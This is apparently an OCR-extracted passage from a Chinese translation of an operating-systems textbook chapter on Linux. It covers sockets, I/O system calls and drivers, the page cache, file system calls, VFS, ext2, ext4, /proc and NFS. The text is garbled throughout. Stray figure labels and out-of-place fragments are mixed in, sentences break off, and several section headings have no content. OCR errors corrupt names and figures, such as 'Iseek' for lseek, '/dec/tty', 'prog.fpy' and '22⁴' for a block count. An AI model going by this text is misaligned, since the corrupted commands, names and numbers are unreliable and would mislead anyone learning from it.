UNIX首创并在Linux中差不多原封不动地引入。
在Berkeley的 设
发送进程 接收进程
用户空间
套接字
连接
网络
图10-19 网络中使用套接字
类型，这在套接字创建时指定。
最常用的类型是：
1)可靠的面向连接的字节流。
2)可靠的面向连接的数据包流。
3)不可靠的数据包传输。
第一种套接字类型允许在不同机器上的两个进程之间建立一个等同于管道的连接。
字节从一个端点 注入然后按注入的顺序从另外一个端点流出。
系统保证所有被传送的字节都能够到达，并且按照发送时 的顺序到达。
在创建套接字时，有一个参数指定使用的协议。
对于可靠字节流通信来说，使用最广泛的协议是 TCP (传输控制协议)。
对于不可靠数据包传输来说，UDP (用户数据报协议)是最常用的协议。
这两 种协议都位于IP (互联网协议)层之上。
这些协议都源于美国国防部的ARPANET, 并成为现在互联网 的基础。
目前没有可靠数据包流类型的通用协议。
在一个套接字能够用于网络通信之前，必须有一个地址与它绑定。
这个地址可以是几个命名域中的 一个。
最常用的域为互联网 (Internet) 命名域，它在V4 (第4个版本)中使用32位整数作为其命名端点， 在V6中使用128位整数 (V5 是一个实验系统，从未成为主流)。
一旦套接字在源计算机和目的计算机都建立成功，则两个计算机之间可以建立起一个连接(对于面 向连接的通信来说)。
一方在本地套接字上使用一个listen 系统调用，它创建一个缓冲区并且阻塞，直到 数据到来。
另一方使用connect 系统调用，并且把本地套接字的文件描述符和远程套接字的地址作为参 数传递进去。
如果远程一方接受了此次调用，则系统在两个套接字之间建立起一个连接。
一旦连接建立成功，它的功能就类似于一个管道。
一个进程可以使用本地套接字的文件描述符来从 中读写数据。
当此连接不再需要时，可以用常用的方式，即通过close 系统调用来关闭它。
10.5.3 Linux中 的I/O系统调用
Linux系统中的每个I/O设备都有一个特殊文件与其关联。
大部分的I/O只使用合适的文件就可以完 成，并不需要特殊的系统调用。
然而，有时需要一些设备专用的处理。
在POSIX 之前，大部分UNIX系 统有一个叫作ioctl的系统调用，它在特殊文件上执行大量设备专用的操作。
数年之间，此系统调用已经 变得非常混乱。
POSIX 对其进行了清理，把它的功能划分为主要面向终端设备的独立的功能调用。
在 Linux 和现代UNIX系统中，每个功能调用是独立的系统调用，还是它们共享一个单独的系统调用或依赖
于实现的其他方式。
图10-20 管理终端的主要POSIX系统调用
贵了。
网络世界中的时代已经改变了。
电话
列表中的最后两个系统调用主要用来设置和读回所有用来消除字符和行以及中断进程等功能的特殊 字符。
另外，它们可以使回显有效或无效，处理流的控制以及执行其他相关功能。
还有一些I/O功能调
实例研究1: UNIX、Linux和Android 437
用，但是它们都是专用的，所以这里就不进一步讨论了。
此外，ioctl 系统调用依然可用。
10.5.4 I/O在Linux 中的实现
在Linux 中I/O 是通过一系列的设备驱动来实现的，每个设备类型对应一个设备驱动。
设备驱动的功 能是对系统的其他部分隔离硬件的特质。
通过在驱动程序和操作系统其他部分之间提供一层标准的接口， 使得大部分I/O 系统可以被划归到内核的机器无关部分。
当用户访问一个特殊文件时，由文件系统提供此特殊文件的主设备号和次设备号，并判断它是一个 块特殊文件还是一个字符特殊文件。
主设备号用于索引存有字符设备或者块设备数据结构的两个内部散
列表之一。
定位到的数据结构包含指向打开设备、读设备、写设备等功能的函数指针。
次设备号被当作
图10-21展示了一部分可以跟不同的字符设备关联的操作。
每一行指向一个单独的I/O 设备(即一个 单独的驱动程序)。
列表示所有的字符驱动程序必须支持的功能。
除此之外，还有几个其他的功能。
当 一个操作要在一个字符特殊文件上执行时，系统通过检索字符设备的散列表来选择合适的数据结构，然 后调用相应的功能来执行此操作。
因此，每个文件操作都包含指向相应驱动程序的一个函数指针。
图10-21 典型字符设备支持的部分文件操作
每个驱动程序都分为两部分。
这两部分都是Linux 内核的一部分，并且都运行在内核态。
上半部分 运行在调用者的上下文并且与Linux 其他部分交互。
下半部分运行在内核上下文并且与设备进行交互。
驱动程序可以调用内存分配、定时器管理、 DMA 控制等内核过程。
所有可以被调用的内核功能都定义 在一个叫作驱动程序一内核接口 (Driver-Kernel Interface)的文档中。
编写Linux设备驱动的细节请参见 Cooper stein(2009) 和 Corbet 等人(2009)的文献。
I/O系统被划分为两大部分：处理块特殊文件的部分和处理字符特殊文件的部分。
下面将依次讨论 这两部分。
系统中处理块特殊文件(比如，磁盘)I/O 的部分的目标是使必须要完成的传输次数最小。
为了实 现这个目标，Linux 系统在磁盘驱动程序和文件系统之间设置了一个高速缓存 (cache), 如图10 - 22。
在 2.2版本内核之前，Linux 系统完整地维护着两个单独的缓存：页面缓存 (page cache) 和缓冲器缓存 (buffer cache),因此，存储在一个磁盘块中的文件可能会被缓存在两个缓存中。
2.2版本以后的Linux 内 核版本只有一个统一的缓存。
一个通用数据块层 (generic block layer) 把这些组件整合在了一起，执行 磁盘扇区、数据块、缓冲区和数据页面之间必要的转换，并且激活作用于这些结构上的操作。
cache 是内核里面用来保存数以千计的最近使用的数据块的表。
不管本着什么样的目的 (i 节点，目 录或数据)而需要一个磁盘块，系统首先检查这个块是否在cache里面。
如果在cache中，就可以从cache 里直接得到这个块，从而避免了一次磁盘访问，这可以在很大程度上提高系统性能。
如果页面cache 中没有这个块，系统就会从磁盘中把这个块读入到cache 中，然后再从cache中复制到 请求它的地方。
由于页面cache的大小是固定的，因此，前面章节介绍的页面置换算法在这里也是需要的。
页面cache 也支持写数据块，就像读数据一样。
一个程序要回写一个块时，它被写到cache 里，而不 是直接写到磁盘上。
当cache 增长到超过一个指定值时，pdflush 守护进程会把这个块写回到磁盘上。
另 外，为了防止数据块被写回到磁盘之前在cache里存留太长时间，每隔30秒系统会把所有的“脏块”都 写回到磁盘上。
图10-22 Linux I/O系统中一个文件系统的细节
除了正常的磁盘文件，还有其他的块特殊文件，也被称为原始块文件 (raw block file)。
这些文件 允许程序通过绝对块号来访问磁盘，而不考虑文件系统。
它们通常被用于分页和系统维护。
与字符设备的交互是很简单的。
因为字符设备产生和接收的是字符流或字节数据，所以让字符设备 支持随机访问是几乎没有意义的。
不过行规则 (line disciplines) 的使用是个例外。
一个行规则可以和一 个终端设备联合在一起，通过tty_struct 结构来表示，一般作为和终端交换的数据的解释器。
例如，利用 行规则可以完成本地行编辑(即擦除的字符和行可以被删除),回车可以映射为换行，以及其他的特殊 处理能够被完成。
然而，如果一个进程要跟每个字符交互，那么它可以把行设置为原始模式，此时行规 则将被忽略。
另外，并不是所有的设备都有行规则。
实例研究1: UNIX、Linux和Android 439
10.5.5 Linux中的模块
10.6 Linux文件系统
在包括Linux 在内的所有操作系统中，最可见的部分是文件系统。
在本节的以下部分，我们将介绍 隐藏在Linux 文件系统、系统调用以及文件系统实现背后的基本思想。
这些思想中有一些来源于 MULTICS, 虽然有很多已经被MS-DOS 、Windows 和其他操作系统使用过了，但是其他的都是UNIX 类 操作系统特有的。
Linux 的设计非常有意思，因为它忠实地秉承了“小的就是美好的”(Small is Beautiful) 的设计原则。
虽然只是使用了最简的机制和少量的系统调用，但是Linux 却提供了强大而优 美的文件系统。
10.6.1 基本概念
按照惯例，许多程序能识别的文件包含一个基本文件名和一个扩展名，中间用一个点连接(点也被 认为是占用了文件名的一个字符)。
例如一个名为prog.c的文件是一个典型的C源文件，prog.fpy 是一个 典型的Python 程序文件，而prog.o 通常是一个object 文件(编译器的输出文件)。
这个惯例不是操作系统 要求的，但是一些编译器和程序希望是这样，比如一个名为prog.java.gz 的文件可能是一个gzip 压缩的 Java程序。
为了方便，文件可以被组织在一个目录里。
目录存储成文件的形式并且在很大程度上可以作为文件
处理。
目录可以包含子目录，这样可以形成有层次的文件系统。
根目录表示为“/”,它通常包含了多个
mos4/chap-10, 这个路径名告诉系统在根目录里寻找一 图10-23 大部分Linux 系统中一些重要的目录 个叫usr的目录，然后再从usr中寻找ast 目录……依照这种方式，最终找到chap-10 文件。
绝对路径的缺点是文件名太长并且不方便。
因为这个原因，Linux 允许用户和进程把他们当前工作 的目录标识为工作目录 ，这样路径名就可以相对于工作目录命名，这种方式命名的目录名叫作相对路径。
例如，如果/usr/ast/books/mos4 是工作目录，那么shell 命令 cp chap-10 backup-10
和长命令
cp /usr/ast/books/mos4/chap-10/usr/ast/books/mos4/backup-10
的效果是一样的。
一个用户要使用属于另一个用户的文件或者使用文件树结构里的某个文件的情况是经常发生的。
例 如，两个用户共享一个文件，这个文件位于其中某个用户所拥有的目录中，另一个用户需要使用这个文
件时，必须通过绝对路径才能引用它(或者通过改 变工作目录的方式)。
如果绝对路径名很长，那么 每次输入时将会很麻烦。
为了解决这个问题， Linux提供了一种指向已存在文件的目录项，称作 链接 (link)。
以图10-24a为例，两个用户Fred和Lisa一起工 作来完成一个项目，他们需要访问对方的文件。
如果Fred 的工作目录是/usr/fred, 他可以使用 /usr/lisa/x 来访问Lisa目录下的文件x 。
Fred 也可以 如图10-24b所示的方法，在自己目录下创建一个 链接，然后他就可以用x来代替/usr/lisa/x了 。
在上面的例子中，我们说在创建链接之前，
/
bin dev etc lib tmp
usr.
fred, lisa
特
C
a) b) 图10-24 a) 链接前；b) 链接后
Fred引用Lisa的文件x的唯一方法是使用绝对路径。
实际上这并不正确，当一个目录被创建出来时，有两 个目录项“.”和“..”被自动创建出来存放在该目录中，前者代表工作目录自身，而后者表示该目录的 父目录，也就是该目录所在的目录。
这样一来，在/usr/fred 目录中访问Lisa 的文件x的另一个路径 是： . . /lisa/x。
除了普通的文件之外，Linux 还支持字符特殊文件和块特殊文件。
字符特殊文件用来建模串行I/O设 备，比如键盘和打印机。
如果打开并从/dec/tty中读取内容，等于从键盘读取内容，而如果打开并向 /dev/lp 中写内容，等于向打印机输出内容。
块特殊文件通常有类似于/dev/hd1的文件名，它用来直接向 硬盘分区中读取和写入内容，而不需要考虑文件系统。
一个偏移为k字节的read操作，将会从相应分区开 始的第k个字节开始读取，而完全忽略节点和文件的结构。
原始块设备常被一些建立(如mkfs) 或修补 (如fsck) 文件系统的程序用来进行分页和交换。
许多计算机有两块或更多的磁盘。
银行使用的大型机，为了存储大量的数据，通常需要在一台机器 上安装100个或更多的磁盘。
甚至在PC上也至少有两块磁盘——一块硬盘和一个光盘驱动器(如DVD)。
当一台机器上安装了多个磁盘的时候，就产生了如何处理它们的问题。
一个解决方法是在每一个磁盘上安装自包含的文件系统，使它们之间互相独立。
考虑如图10-25a所
示的解决方法，有一个硬盘C:和一个DVD D:,它们都有自己的根目录和文件。
如果使用这种解决方法，
除了默认盘外，使用者必须指定设备和文件，例 如，要把文件x复制到目录d中(假设C:是默认盘), 应该使用命令
cp D:/x la/d/x
这种方法被许多操作系统使用，包括Windows 8 (是从上个世纪的MS-DOS 继承的)。
Linux 的解决方法是允许一个磁盘挂载到另一 个磁盘的目录树上，比如，我们可以把DVD挂载在
目录/b上，构成如图10-25b所示的文件系统。
挂载
之后，用户能够看见一个目录树，而不再需要关心
文件在哪个设备上，上面提到的命令就可以变成 cp/b/x /a/d/x
和所有文件都在硬盘上是一样的。
硬盘 DVD 硬盘
a) b)
图10-25 a) 分离的文件系统；b) 挂载之后
考虑这样的一个例子， 一个数据库组织许多文件在一个或多个目录中，它们可以被不相关的用户访 问。
可以通过设置信号量来解决互斥的问题，在每个目录或文件上设置一个信号量，当程序需要访问相 应的数据时，在相应的信号量上做一个down 操作。
但这样做的缺点是，尽管进程只需要访问一条记录， 信号量却使得整个目录或文件都不能访问。
进程A的共享锁
b)
A的共享锁
B的共享锁
c)
C的共享锁
10.6.2 Linux中的文件系统调用
许多系统调用与文件和文件系统有关。
在本节中，首先研究对单个文件进行操作的系统调用，之后 我们会研究针对目录和文件系统的系统调用。
要创建一个文件时，可以使用creat系统调用。
(曾经有人 问Ken Thompson,如果给他一次重新发明UNIX的机会，他会做什么不同事情，他回答说他要把这个系 统调用的拼写改成create, 而不是现在的creat 。
) 这个系统调用的参数是文件名和保护模式。
于是，
fd =creat("abc",mode);
创建了一个名为abc的文件，并根据mode 设置文件的保护位。
这些保护位决定了用户访问文件的权限及 方式。
在下文将会具体讨论。
creat 系统调用不仅创建了一个新文件，还以写的方式打开了这个文件。
为了使以后的系统调用能 够访问这个文件，creat成功时返回一个非负整数，这个非负整数叫作文件描述符，也就是例子中的fd。
如果creat 作用在一个已经存在的文件上，那么该文件的文件长度会被截短为0,它的内容会被丢弃。
通 过设置合适的参数，open 系统调用也能创建文件。
现在我们继续讨论图10-27列出的主要的文件系统调用。
为了读或写一个已经存在的文件，必须使 用系统调用open 或creat打开这个文件。
它的参数是要打开文件的文件名以及打开方式：只读、只写或 可读可写。
此外，也可以指定不同的选项。
和creat 一 样，open 返回一个文件描述符，可用来进行读写。
然后可以使用close系统调用来关闭文件，它使得文件描述符可以被后来的creat或open 使用。
creat和 open 系统调用总是返回未被使用的最小数值的文件描述符。
当一个程序以标准方式运行时，文件描述符0、1、2已经分别用于标准输入、标准输出和标准错误。
通过这种方式，一个过滤器，比如sort 程序，可以从文件描述符0读取输入，输出到文件描述符1,而不 需要关心这些文件是什么。
这种机制能够有效是因为shell 在程序启动之前就设置好了它们的值。
毫无疑问，最常使用的文件系统调用是read 和write。
它们每个都有三个参数：文件描述符(标明 要读写的文件)、缓冲区地址(给出数据存放的位置或者读取数据的位置),长度(给出要传输的数据的 字节数)。
这些就是全部了。
这种设计非常简单，一个典型的调用方法是：
n=read(fd,buffer,nbytes);
图10-27 跟文件相关的一些系统调用。
如果发生错误，那么返回值s是 - 1 ;fd 是一个文件描述符， position是文件偏移。
参数的含义是很清楚的
虽然几乎所有程序都是顺序读写文件的，但是一些程序需要能够从文件的任何位置随机地读写文件。
实例研究1: UNIX、Linux和Android 443
每个文件都有一个指针指向文件当前的读写位置。
当顺序地读写文件时，这个指针指向将要读写的字节。
如果文件位置指针最初指向4096,在读取了1024个字节后，它会自动地指向第5120个字节。
Iseek 系统 调用可以改变位置指针的值，所以之后的read 和write 可以从文件的任何位置开始读写，甚至是超出文件 的结尾。
这个系统调用叫作lseek, 是为了避免与seek 冲突，其中后者以前在16位计算机上用于查找， 现在已经不使用了。
Iseek有三个参数：第一个是文件描述符，第二个是文件读写位置，第三个表明读写位置是相对于 文件开头、当前位置还是文件尾。
Iseek 的返回值是当读写位置改变后的绝对位置。
有点讽刺的是， Iseek 是唯一一个从不会引起实际的磁盘寻道的文件系统调用，因为它所做的只是修改了内存中的一个 值(文件读写位置)。
对于每个文件，Linux 记录了它的文件类型(普通文件、目录、特殊文件)、大小、最后一次修改时
间和其他信息。
程序可以使用stat系 统调用来查看这些信息，stat 的第一 个参数是文件名，第二个参数是指向 获取的文件信息将要存放的结构的指 针，该结构的各个域如图10-28所示。
系统调用fstat的作用和stat一样，唯 一不同的是，fstat针对一个打开的文 件(文件名可能未知)进行操作，而 不是一个路径名。
pipe 系统调用用来创建一个shell 管线。
它创建了一种伪文件 (pseudo- file), 用于缓冲管线通信的数据，并
图10-28 stat 系统调用返回的域
给缓冲区的读写都返回文件描述符。
以下面的管线为例：
sort <in |head-30
在执行sort 的进程中，文件描述符1(标准输出)被设置为写入管道，执行head的进程中，文件描述 符0(标准输入)被设置为从管道读取。
通过这种方式，sort 只是从文件描述符0(被设置为文件in) 读取， 写入到文件描述符1(管道),甚至不会觉察到它们已经被重定向了。
如果它们没有被重定向，sort 将会 自动从键盘读取数据，而后输出到显示器(默认设备)。
同样地，当head从文件描述符0中读取数据时， 它读取到的是sort 写入到管道缓冲区中的数据，head甚至不知道自己使用了管道。
这个例子清晰地表明了 如何使用一个简单的概念(重定向)和一个简单的实现(文件描述符0和1)来实现一个强大的工具(以 任意方式连接程序，而不需要去修改它们)。
如图10-24所示，创建一个指向 已有文件的链接时创建了一个目录项 (directory entry)。
系统调用link用于 创建链接，它的参数是已有文件的文
图10-29 与目录相关的 一 些系统调用。
如果发生错误，那么 返回值s是 - 1 ,dir 是 一个目录流，dirent 是一个目录项。
参数的含义是自解释的
件名和链接的名称，使用unlink 可以删除目录项。
当文件的最后一个链接被删除时，这个文件会被自动 删除。
对于一个没有被链接的文件，对其使用unlink 也会让它从目录中消失。
使用chdir系统调用可以改变工作目录，工作目录的改变会影响到相对路径名的解释。
图10-29给出的最后四个系统调用是用于读取目录的。
和普通文件类似，它们可被打开、关闭和读取。
每次调用readdir都会以固定的格式返回一个目录项。
用户不能对目录执行写操作(为了保证文件系统的完 整性),但可以使用creat 或link 在文件夹中创建一个目录，或使用unlink 删除一个目录。
同样地，用户不能 在目录中查找某个特定文件，但是可以使用rewinddir作用于一个打开的目录，使得它能再次从头读取。
10.6.3 Linux文件系统的实现
在本节中，我们首先研究虚拟文件系统 (Virtual File System,VFS) 层支持的抽象。
VFS 对高层进 程和应用程序隐藏了Linux 支持的所有文件系统之间的区别，以及文件系统是存储在本地设备，还是需 要通过网络访问的远程设备。
设备和其他特殊文件也可以通过VFS访问。
接下来，我们将描述第一个被 Linux 广泛使用的文件系统ext2(second extended file system)。
随后，我们将讨论ext4 文件系统中所作的 改进。
所有的Linux 都能处理有多个磁盘分区且每个分区上有一个不同文件系统的情况。
1.Linux 虚拟文件系统
为了使应用程序能够与在本地或远程设备上的不同文件系统进行交互，Linux 采用了一个和其他 UNIX 系统相同的方法：虚拟文件系统。
VFS 定义了一个基本的文件系统抽象以及这些抽象上允许的操 作集合。
调用上节中提到的系统调用访问VFS 的数据结构，确定要访问的文件所属的文件系统，然后通 过存储在VFS数据结构中的函数指针调用该文件系统的相应操作。
图10-30总结了VFS 支持的四个主要的文件系统结构。
其中，超级块包含了文件系统布局的重要信 息，破坏了超级块将会导致文件系统不可读。
每个i 节点 (i-node,index-node 的简写，但是从来不这样称
为了便于目录操作及路径(比如 /usr/ast/bin) 的遍历，VFS 支持dentry 数
图10-30 VFS支持的文件系统抽象
据结构，它表示一个目录项。
这个数据结构由文件系统在运行过程中创建。
目录项被缓存在 dentry_cache 中，比如，dentry_cache 会包含/,/usr,/usr/ast 的目录项。
如果多个进程通过同一个硬连接 (即相同路径)访问同一个文件，它们的文件对象都会指向这个cache中的同一个目录项。
file 数据结构是一个打开文件在内存中的表示，并且在调用open 系统调用时被创建。
它支持read、 write 、sendfile 、lock 等上一节中提到的系统调用。
在VFS下层实现的实际文件系统并不需要在内部使用与VFS完全相同的抽象和操作，但是必须实现 跟VFS对象所指定的操作在语义上等价的文件系统操作。
这四个VFS对象中的operations 数据结构的元素 都是指向底层文件系统函数的指针。
2.Linux ext2文件系统
接下来，我们介绍在Linux中最流行的磁盘文件系统：ext2。
第 一 个Linux操作系统使用MINIX文件 系统，但是它限制了文件名长度并且文件长度最大只能是64MB。
后 来MINIX 被第一代扩展文件系统ext 文件系统取代。
ext可以支持长文件名和大文件，但由于它的效率问题，ext被ext2代 替 ，ext2在今天还在 广泛使用。
ext2的磁盘分区包含了一个如图10-31所示的文件系统。
块0不被Linux 使用，而通常用来存放启动 计算机的代码。
在块0后面，磁盘分区被划分为若干个块组，划分时不考虑磁盘的物理结构。
每个块组 的结构如下：
第一个块是超级块，它包含了该文件系统的信息，包括i 节点的个数、磁盘块数以及空闲块链表的
实例研究1: UNIX、Linux和Android 445
起始位置(通常有几百个项)。
下一个是组描述符，存放了位图 (bitmap) 的位置、空闲块数、组中的i 节点数，以及组中目录数等信息，这个信息很重要，因为ext2试图把目录均匀地分散存储到磁盘上。
《
图10-31 Linux ext2文件系统的磁盘布局
两个位图分别记录空闲块和空闲i节点，这是从MINIX1 文件系统继承的(大多数UNIX文件系统不 使用位图，而使用空闲列表)。
每一个位图的大小是一个块。
如果一个块大小是1KB, 那么就限制了块 数和i 节点数只能是8192个。
块数是一个严格的限制，但是在实际应用中，i 节点数并不是。
如果一个块 的大小是4KB, 那么节点数量是4倍多。
在超级块之后是节点存储区域，它们被编号为1到某个最大值。
每个节点的大小是128字节，并且 每一个i 节点恰好描述一个文件。
i 节点包含了统计信息(包含了stat 系统调用能获得的所有信息，实际上 stat 就是从i节点读取信息的),也包含了所有存放该文件数据的磁盘块的位置。
在i节点区后面是数据块区，所有文件和目录都存放在这个区域。
对于一个包含了一个以上磁盘块 的文件和目录，这些磁盘块是不需要连续的。
实际上，一个大文件的块有可能遍布在整个磁盘上。
目录对应的节点散布在磁盘块组中。
如果有足够的空间，ext2 会把普通文件组织到与父目录相同的块 组上，而把同一个块上的数据文件组织成初始文件i节点。
这个思想来自Berkeley 的快速文件系统 (McKusick 等人，1984)。
位图用于快速确定在什么地方分配新的文件系统数据。
在分配新的文件块时， ext2也会给该文件预分配许多(8个)额外的数据块，这样可以减少将来向该文件写入数据时产生的文件碎 片。
这种策略在整个磁盘上实现了文件系统负载平衡，而且由于对文件碎片进行了排列和缩减，使得它的 性能也很好。
要访问文件，必须首先使用一个Linux 系统调用，例如open, 该调用需要文件的路径名。
解析路径 名以解析出单独的目录。
如果使用相对路径，则从当前进程的当前目录开始查找，否则就从根目录开始。
在以上两种情况中，第一个目录的节点很容易定位：在进程描述符中有指向它的指针；或者在使用根
目录的情况下，它存储在磁盘上预定的块上。
目录文件允许不超过255个字符的文件名，如图10-32所示。
每一个目录都由整数个磁盘块组成，这 样目录就可以整体写入磁盘。
在一个目录中，文件和子目录的目录项是未排序的，并且一个紧挨着一个。
目录项不能跨越磁盘块，所以通常在每个磁盘块的尾部会有部分未使用的字节。
图10-32中的每个目录项由四个固定长度的域和一个可变长度的域组成。
第一个域是i 节点号，文件 colossal的i节点号是19,文件voluminous的i 节点号是42,目录bigdir的i节点号是88。
接下来是rec_len 域 ， 标明该目录项的大小(以字节为单位),可能包括名字后面的一些填充。
在名字以未知长度填充时，这 个域被用来寻找下一个目录项。
这也是图10-32中箭头的含义。
接下来是类型域：文件、目录等。
最后 一个固定域是文件名的长度(以字节为单位),在例子中是8、10和6。
最后是文件名，文件名以字节0结 束，并被填充到32字节边界。
额外的填充可以在此之后。
由于目录是按线性顺序查找的，要找到一个位于大目录末尾的目录项会耗费相当长的时间。
因此， 系统为近期访问过的目录维护一个缓存。
该缓存使用文件名进行查找，如果命中，那么就可以避免费时 的线性查找。
组成路径的每个部分都在目录缓存中保存一个dentry 对象，并且通过它的i 节点查找到后续 的路径元素的目录项，直到找到真正的文件节点。
图10-32 a)一个含有三个文件的Linux目录；b)文件voluminous被删除后的目录
如果文件存在，那么系统提取其i节点号并以它为索引在i节点表(在磁盘上)中定位相应的i节点， 并装入内存。
i 节点被存放在i节点表中，其中i节点表是一个内核数据结构，用于保存所有当前打开的 文件和目录的i 节 点 。
i 节点表项的格式至少要包含stat 系统调用返回的所有域，以保证stat 正常运行 (见图10-28)。
图10-33中列出了节点结构中由Linux文件系统层支持的一些域。
实际的i节点结构包含更 多的域，这是由于该数据结构也用于表示目录、设备以及其他特殊文件。
i 节点结构中还包含了一些为 将来的应用保留的域。
历史已经表明未使用的位不会长时间保持这种方式。
图10-33 Linux的节点结构中的一些域
现在来看看系统如何读取文件。
对于调用了read 系统调用的库函数的一个典型使用是：
n=read(fd,buffer,nbytes);
当内核得到控制权时，它需要从这三个参数以及内部表中与用户有关的信息开始。
内部表中的项目之一 是文件描述符数组。
文件描述符数组用文件描述符作为索引并为每 一 个打开的文件保存 一 个表项(最多 达到最大值，通常默认是32个)。
这里的思想是从一个文件描述符开始，找到文件对应的i节点为止。
考虑一个可能的设计：在文件 描述符表中存放一个指向i节点的指针。
尽管这很简单，但不幸的是这个方法不能奏效。
其中存在的问 题是：与每个文件描述符相关联的是用来指明下一次读(写)从哪个字节开始的文件读写位置，它该放 在什么地方?
一个可能的方法是将它放到i节点表中。
但是，当两个或两个以上不相关的进程同时打开 同一个文件时，由于每个进程有自己的文件读写位置，这个方法就失效了。
s>X
下被调用，我们预期p1将它的输出写到x中，然后p2也将输出写到x中，并且从p1结束的地方开始。
当shell 生成p1时 ，x 初始是空的，从而p1从文件位置0开始写入。
然而，当p1结束时就必须通过某种 机制使得p2看到的初始文件位置不是0(如果将文件位置存放在文件描述符表中，p2 将看到0),而是p1 结束时的位置。
实现这一点的方法如图10-34所示。
实现的技巧是在文件描述符表和i 节点表之间引入一个新的表， 叫作打开文件描述表，并将文件读写位置(以及读/写位)放到里面。
在这个图中，父进程是shell而子进 程首先是p1然后是p2。
当 shell 生成p1时 ，p1的用户结构(包括文件描述符表)是shell的用户结构的一个 副本，因此两者都指向相同的打开文件描述表的表项。
当p1结束时，shell 的文件描述符仍然指向包含p1 的文件位置的打开文件描述。
当shell 生成p2时，新的子进程自动继承文件读写位置，甚至p2和shell 都不 需要知道文件读写位置到底是在哪里。
然而，当不相关的进程打开该文件时，它将得到自己的打开文件描述表项，以及自己的文件读写位 置，而这正是我们所需要的。
因此，打开文件描述表的重点是允许父进程和子进程共享一个文件读写位 置，而给不相关的进程提供各自私有的值。
再来看读操作，我们已经说明了如何定位文件读写位置和i节 点 。
i节点包含文件前12个数据块的磁 盘地址。
如果文件位置是在前12个块，那么这个块被读入并且其中的数据被复制给用户。
对于长度大于 12个数据块的文件，节点中有一个域包含一个一级间接块的磁盘地址，如图10-34所示。
这个块含有更
图10-34 文件描述符表、打开文件描述表和i 节点表之间的关系
多的磁盘块的磁盘地址。
例如，如果一个磁盘块大小为1KB 而磁盘地址长度是4字节，那么这个一级间 接块可以保存256个磁盘地址。
因此这个方案只对于总长度在268KB以内的文件适用。
除此之外，还使用一个二级间接块。
它包含256个一级间接块的地址，每个一级间接块保存256个数 据块的地址。
这个机制能够处理10+2¹⁶个块(67119104字节)。
如果这样仍然不够，那么i节点为三级间 接块留下了空间，三级间接块的指针指向许多二级间接块。
这个寻址方案能够处理大小为22⁴个1KB块 (16GB) 的文件。
对于块大小是8KB的情况，这个寻址方案能够支持最大64TB的文件。
3.Linux ext4文件系统
为了防止由系统崩溃和电源故障造成的数据丢失，ext2 文件系统必须在每个数据块创建之后立即将 其写出到磁盘上。
必需的磁盘磁头寻道操作导致的延迟是如此之长以至于性能差得无法让人接受。
因此， 写操作被延迟，对文件的改动可能在30秒内都不会提交给磁盘，而相对于现代的计算机硬件来说，这是 一段相当长的时间间隔。
为了增强文件系统的健壮性，Linux 依靠日志文件系统。
ext3 是一个日志文件系统，它在ext2 文件系 统之上做了改进。
ext4 是ext3的改进，也是一个日志文件系统，但不同于ext3,它改变了ext3所采用的块 寻址方案，从而同时支持更大的文件和更大的整体文件系统。
我们后面将介绍它的一些特点。
这种文件系统背后的基本思想是维护一个日志，该日志顺序记录所有文件系统操作。
通过顺序写出 文件系统数据或元数据 (i 节点，超级块等)的改动，该操作不必忍受随机磁盘访问时磁头移动带来的 开销。
最后，这些改动将被写到适当的磁盘地址，而相应的日志项可以被丢弃。
如果系统崩溃或电源故 障在改动提交之前发生，那么在重启动过程中，系统将检测到文件系统没有被正确地卸载。
然后系统遍 历日志，并执行日志记录所描述的文件系统改动。
ext4 设计成与ext2和ext3高度兼容，尽管其核心数据结构和磁盘布局被修改过。
此外，一个作为ext2 系统被卸载的文件系统随后可以作为ext4系统被挂载并提供日志能力。
日志是一个以环形缓冲器形式组织的文件。
日志可以存储在主文件系统所在的设备上也可以存储在 其他设备上。
由于日志操作本身不被日志记录，这些操作并不是被日志所在的ext4 文件系统处理的，而 是使用一个独立的日志块设备 (Journaling Block Device,JBD) 来执行日志的读/写操作。
JBD 支持三个主要数据结构：日志记录、原子操作处理和事务。
一个日志记录描述一个低级文件系 统操作，该操作通常导致块内变化。
鉴于系统调用(如write)包含多个地方的改动——i节点、现有的文 件块、新的文件块、空闲块列表等，所以将相关的日志记录按照原子操作分成组。
Ext3将系统调用过程的 起始和结束通知JBD, 这样JBD能够保证一个原子操作中的所有日志记录或者都被应用，或者没有一个被 应用。
最后，主要从效率方面考虑，JBD 将原子操作的汇集作为事务对待。
一个事务中日志记录是连续存 储的。
仅当一个事务中的所有日志记录都被安全提交到磁盘后，JBD 才允许日志文件的相应部分被丢弃。
把每个磁盘改动的日志记录项写到磁盘可能开销很大，ext4 可以配置为保存所有磁盘改动的日志或 者仅仅保存文件系统元数据 (i 节点、超级块等)改动的日志。
只记录元数据会使系统开销更小，性能 更好，但是不能保证文件数据不会损坏。
一些其他的日志文件系统仅仅维护关于元数据操作的日志(例 如 ，SGI的XFS) 。
此外，该日志的可靠性还可以进一步通过校验而改善。
4./proc文件系统
另一个Linux 文件系统是/proc(process) 文件系统。
其思想来自于Bell 实验室开发的第8版UNIX, 后来被4.4BSD和System V采用。
不过，Linux 在几个方面对该思想进行了扩充。
其基本概念是为系统中 的每个进程在/proc中创建一个目录。
目录的名字是进程PID的十制数值。
例如，/proc/619 是与PID为619 的进程相对应的目录。
在该目录下是进程信息的文件，如进程的命令行、环境变量和信号掩码等。
事实 上，这些文件在磁盘上并不存在。
当读取这些文件时，系统按需从进程中抽取这些信息，并以标准格式
将其返回给用户。
10.6.4 NFS: 网络文件系统
网络在Linux 中起着重要作用，在UNIX 中也是如此——自从网络出现开始(第一个UNIX网络是为 了将新的内核从PDP-11/70 转移到Interdata 8/32上而建立的)。
本节将考察Sun Microsystem的NFS ( 网 络 文件系统)。
该文件系统应用于所有的现代Linux系统中，其作用是将不同计算机上的不同文件系统连接 成一个逻辑整体。
当前主流的NFS 实现是1994年提出的第3版。
NFS 第4版在2000年提出，并在前一个 NFS 体系结构上做了一些增强。
NFS 有三个方面值得关注：体系结构、协议和实现。
我们现在将依次考 察这三个方面，首先是简化的NFS第3版，然后简要探讨第4版所做的增强。
1.NFS 体系结构
图10-35 远程挂载的文件系统的例子。
图中的方框表示目录，圆形表示文件
2.NFS 协议
另一方面，我们默认在自动挂载时所有可选的文件系统都是完全相同的。
由于NFS不提供对文件或
目录复制的支持，用户需要自己确保所有这些文件系统都是相同的。
因此，自动挂载多数情况下被用于
包含系统二进制文件和其他很少改动的文件的只读文件系统。
3.NFS 实现
实例研究1: UNIX、Linux和Android 451
图10-36 NFS 层次结构
当文件描述符被用于后续的系统调用(例如read) 时 ，VFS 层先定位相应的v节点，然后根据它确
4.NFS 第4版
10.7 Linux的安全性
